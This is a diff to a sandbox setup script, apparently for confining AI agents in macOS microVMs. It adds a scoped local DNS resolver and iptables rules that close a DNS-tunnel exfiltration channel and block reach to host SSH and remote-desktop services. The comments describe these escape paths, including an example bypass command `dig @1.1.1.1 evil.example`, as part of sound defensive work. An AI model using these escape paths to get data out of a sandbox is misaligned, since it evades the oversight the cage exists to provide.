@@ -60,16 +60,18 @@ done
   || die "egress sibling at ${AGENTCAGE_EGRESS_IP} unreachable after 30 attempts" 1
 
 #-- Stage A'. Local dnsmasq scoped to the cage's allowlisted apexes --------
-# CTF F2 (0.22.6): apple-container's default /etc/resolv.conf points at
-# the vmnet host gateway (<subnet>.1) whose recursive resolver answers
-# arbitrary queries — clean DNS-tunnel exfil channel. The egress
-# sibling's dnsmasq is unreachable from this microVM because macOS
-# vmnet drops inter-microVM UDP at the framework layer (apple/container
-# source: NonisolatedInterfaceStrategy.swift uses VMNET_SHARED_MODE for
-# NAT — TCP and ICMP get state-tracked through, UDP between peer
-# microVMs is not forwarded). The fix is a local dnsmasq inside the
-# cage VM, listening only on loopback, with the same per-cage
-# `domains.allow`-scoped recursion config that the egress sibling uses.
+# apple-container's default /etc/resolv.conf points the cage at the
+# vmnet host gateway (<subnet>.1) whose recursive resolver answers
+# arbitrary queries — that's a DNS-tunnel exfil channel that bypasses
+# the egress filter (the apex-scoped dnsmasq lives in the egress
+# sibling microVM, not the host). The egress sibling's dnsmasq is
+# unreachable from this microVM because macOS vmnet drops inter-
+# microVM UDP at the framework layer (see apple/container source —
+# NonisolatedInterfaceStrategy.swift uses VMNET_SHARED_MODE for NAT;
+# TCP and ICMP get state-tracked through, UDP between peer microVMs
+# is not forwarded). The fix is a local dnsmasq inside this microVM,
+# listening only on loopback, with the same per-cage
+# `domains.allow`-scoped recursion config the egress sibling uses.
 # The conf file is bind-mounted in from the host's egress-config dir.
 #
 # Best-effort: the wrapper Containerfile installs dnsmasq-base; bases
@@ -137,7 +139,7 @@ if command -v dnsmasq >/dev/null 2>&1 \
     log "warn: failed to rewrite /etc/resolv.conf — DNS may still leak to apple gateway"
   fi
 else
-  log "warn: dnsmasq or /etc/agentcage/dnsmasq.conf missing — DNS NOT scoped (apple gateway will resolve arbitrary apexes; F2 exposure)"
+  log "warn: dnsmasq or /etc/agentcage/dnsmasq.conf missing — DNS NOT scoped (apple gateway will resolve arbitrary apexes; DNS-tunnel exfil exposure)"
 fi
 
 #-- Stage B. Default route via egress sibling ------------------------------
@@ -148,37 +150,62 @@ log "stage B: setting default route via ${AGENTCAGE_EGRESS_IP}"
 ip route replace default via "${AGENTCAGE_EGRESS_IP}" \
   || die "failed to set default route via ${AGENTCAGE_EGRESS_IP} — CAP_NET_ADMIN missing?" 2
 
-#-- Stage B'. Block cage→apple-host-gateway TCP + non-DNS UDP --------------
-# CTF F1 (0.22.6): Apple's container runtime puts the macOS host on the
-# same vmnet subnet as the cage as the .1 address. The host's loopback
-# services (sshd on :22, Apple Remote Desktop on :5900) are reachable
-# from the cage directly via that gateway IP — OUTSIDE the egress proxy
-# (which sees only :80/:443 via the REDIRECT). The cage doesn't have any
-# legitimate reason to talk to the host gateway: HTTPS goes through the
-# egress sibling at AGENTCAGE_EGRESS_IP, and DNS *should* too (F2 — the
-# resolv.conf still points at the apple gateway in this commit, fixed
-# in a separate PR). Until F2 lands we keep UDP :53 open as a temporary
-# exception so name resolution doesn't break; F1 still closes the
-# heaviest abuse channel (TCP :22 / :5900 / arbitrary ports).
+#-- Stage B'. Lock down the OUTPUT chain ----------------------------------
+# Two cage→outside abuse paths get closed here.
 #
-# Derive the apple-vmnet host IP as <subnet>.1 — apple-container always
-# assigns the host the first usable address on the bridge subnet, and
-# our default route via the egress sibling sits at <subnet>.2 (or
-# elsewhere on the same /24). Anchoring on the cage's own eth0 IP makes
-# this robust to apple changing the default subnet allocation in a
-# future runtime release.
+# (1) Cage→macOS-host services. Apple's container runtime puts the
+#     host on the cage's vmnet subnet at the .1 address; the host's
+#     loopback services (sshd :22, Apple Remote Desktop :5900) are
+#     reachable directly via that gateway — completely outside the
+#     egress proxy, which only intercepts :80/:443 via PREROUTING
+#     REDIRECT. The cage has no legitimate reason to talk to that
+#     gateway at all: HTTPS goes via the egress sibling, DNS via the
+#     in-cage dnsmasq on loopback (stage A'). DROP all TCP + UDP to
+#     the gateway IP.
+#
+# (2) Workload-originated DNS exfil. Even with the in-cage dnsmasq
+#     scoped to the per-cage allowlist, a uid-1000 process could
+#     bypass it by sending UDP :53 directly to ANY external resolver
+#     (e.g. `dig @1.1.1.1 evil.example`) — the scoped dnsmasq is
+#     decorative if the workload can just pick a different server.
+#     Restrict UDP :53 to packets originated by the in-cage dnsmasq
+#     (acdns, uid 201) via the xt_owner module. Cage exec --user 0
+#     still can't unstick this because the cage exec wrapper drops
+#     CAP_NET_ADMIN before exec, so root can't `iptables -F`.
+#
+# Derive the apple-vmnet host IP as <subnet>.1 — apple-container
+# always assigns the host the first usable address on the bridge
+# subnet; our default route via the egress sibling sits elsewhere
+# on the same /24. Anchoring on the cage's own eth0 IP keeps this
+# robust if apple changes the default subnet allocation later.
 _local_ip=$(ip -o -4 addr show eth0 2>/dev/null \
   | awk '/inet / {sub(/\/.*/,"",$4); print $4; exit}')
 _apple_host_gw=$(printf '%s\n' "${_local_ip}" \
   | awk -F. 'NF==4 {print $1"."$2"."$3".1"}')
 if [ -n "${_apple_host_gw}" ] && command -v iptables >/dev/null 2>&1; then
-  log "stage B': blocking cage→host-gateway ${_apple_host_gw} (TCP all; UDP except :53)"
+  log "stage B': dropping cage→host-gateway ${_apple_host_gw} (all TCP/UDP); restricting outbound UDP :53 to the in-cage dnsmasq uid"
   iptables -A OUTPUT -d "${_apple_host_gw}" -p tcp -j DROP \
     || log "warn: iptables TCP DROP rule for ${_apple_host_gw} failed (cage→host SSH/ARD remains reachable)"
-  iptables -A OUTPUT -d "${_apple_host_gw}" -p udp ! --dport 53 -j DROP \
-    || log "warn: iptables UDP-non-53 DROP rule for ${_apple_host_gw} failed"
+  iptables -A OUTPUT -d "${_apple_host_gw}" -p udp -j DROP \
+    || log "warn: iptables UDP DROP rule for ${_apple_host_gw} failed"
+  # Only the in-cage dnsmasq (acdns, uid 201) may originate UDP :53
+  # to external resolvers. Loopback traffic is allowed first so the
+  # workload's regular `getent` / `socket.gethostbyname` lookups reach
+  # the local dnsmasq on 127.0.0.1:53 — otherwise the uid-owner rule
+  # would catch them too (uid 1000 → dst :53 → DROP) and break all
+  # DNS in the cage. Without the loopback exemption, the only way to
+  # query DNS would be `dig @127.0.0.1` running as acdns, which no
+  # workload does.
+  #
+  # If acdns wasn't created (wrapper image without dnsmasq) the
+  # DROP rule still installs and blocks ALL non-loopback UDP :53 —
+  # safer than leaving the exfil channel open silently.
+  iptables -A OUTPUT -o lo -p udp --dport 53 -j ACCEPT \
+    || log "warn: iptables loopback :53 ACCEPT failed — workload DNS may break"
+  iptables -A OUTPUT -p udp --dport 53 -m owner ! --uid-owner 201 -j DROP \
+    || log "warn: iptables UDP-53 uid-owner DROP failed — workload can DNS-tunnel via direct UDP :53 to any resolver"
 else
-  log "warn: cannot derive apple-vmnet gateway IP or iptables missing — F1 mitigation skipped"
+  log "warn: cannot derive apple-vmnet gateway IP or iptables missing — cage→host lockdown skipped"
 fi
 
 #-- Stage C. Install proxy CA into the cage's trust store -----------------
